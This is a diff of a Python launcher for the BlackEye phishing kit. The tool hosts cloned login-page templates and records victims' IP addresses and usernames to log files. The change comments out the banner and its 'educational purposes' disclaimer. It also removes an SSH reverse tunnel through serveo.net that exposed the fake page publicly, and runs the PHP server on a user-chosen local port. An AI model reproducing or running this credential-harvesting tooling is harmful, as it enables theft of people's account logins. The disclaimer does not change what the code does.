@@ -20,22 +20,22 @@ class colors:
     END      = '\33[0m'
 
 try:
-    print(colors.RED + """
-                        BlackEye Python
+#     print(colors.RED + """
+#                         BlackEye Python
 
-Original Shell Program Created By thelinuxchoice
-Link to Original: https://github.com/thelinuxchoice/blackeye
+# Original Shell Program Created By thelinuxchoice
+# Link to Original: https://github.com/thelinuxchoice/blackeye
 
-Differences:
-    - This is written in Python
-    - Uses Serveo with A Custom Sub-Domain
+# Differences:
+#     - This is written in Python
+#     - Uses Serveo with A Custom Sub-Domain
 
-                        :: DISCLAIMER ::
+#                         :: DISCLAIMER ::
 
-I nor the original developers take any responsibility for actions caused
-by using this program. Any misuse or damage caused by BlackEye is on the
-users behalf. Use for EDUCATIONAL PURPOSES!
-    """ + colors.END)
+# I nor the original developers take any responsibility for actions caused
+# by using this program. Any misuse or damage caused by BlackEye is on the
+# users behalf. Use for EDUCATIONAL PURPOSES!
+#     """ + colors.END)
 
     print(colors.GREEN + """
                        Availble Templates
@@ -97,11 +97,12 @@ Please Choose A Number To Host Template:
         pass
     choice = templates[number]
     print("Loading %s" % (choice))
-    print("\nEnter A Custom Subdomain")
-    subdom = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
-    print(colors.GREEN + "Starting Server at %s.serveo.net..." % (subdom))
+    # print("\nEnter A Custom Subdomain")
+    # subdom = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
+    port = input('What port do you want it on? :')
+    #print(colors.GREEN + "Starting Server at %s.serveo.net..." % (subdom))
     print("Logs Can Be Found In sites/%s/ip.txt and sites/%s/usernames.txt" % (choice, choice) + colors.END)
-    cmd_line = "sudo php -t sites/%s -S 127.0.0.1:80 & ssh -R %s.serveo.net:80:127.0.0.1:80 serveo.net" % (choice, subdom)
+    cmd_line = f"sudo php -t sites/{choice} -S 127.0.0.1:{port}"
     p = subprocess.Popen(cmd_line, shell=True)
     out = p.communicate()[0]
 
